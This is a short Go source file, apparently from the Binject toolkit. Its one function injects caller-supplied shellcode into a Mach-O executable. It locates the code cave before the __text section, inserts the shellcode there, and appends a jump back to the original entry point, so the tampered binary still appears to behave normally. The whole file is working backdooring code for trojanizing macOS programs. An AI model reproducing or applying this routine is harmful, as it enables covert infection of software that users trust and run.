package bj

import (
	"bytes"
	"log"

	"github.com/Binject/debug/macho"
	"github.com/Binject/shellcode/api"
)

// MachoBinject - Inject shellcode into an Mach-O binary
func MachoBinject(sourceBytes []byte, shellcodeBytes []byte, config *BinjectConfig) ([]byte, error) {

	//
	// BEGIN CODE CAVE DETECTION SECTION
	//
	machoFile, err := macho.NewFile(bytes.NewReader(sourceBytes))
	if err != nil {
		return nil, err
	}
	for _, section := range machoFile.Sections {
		if section.SectionHeader.Seg == "__TEXT" && section.Name == "__text" {
			caveOffset := 0x20 /* magic value */ + machoFile.FileHeader.Cmdsz
			log.Printf("Code Cave Size: %x - %x = %x\n", section.Offset, caveOffset, section.Offset-caveOffset)
			//
			// END CODE CAVE DETECTION SECTION
			//

			shellcode := api.ApplySuffixJmpIntel64(shellcodeBytes, uint32(caveOffset), uint32(machoFile.EntryPoint), machoFile.ByteOrder)
			machoFile.Insertion = shellcode
			break
		}
	}

	machoData, err := machoFile.Bytes()
	if err != nil {
		return nil, err
	}

	return machoData, nil
}
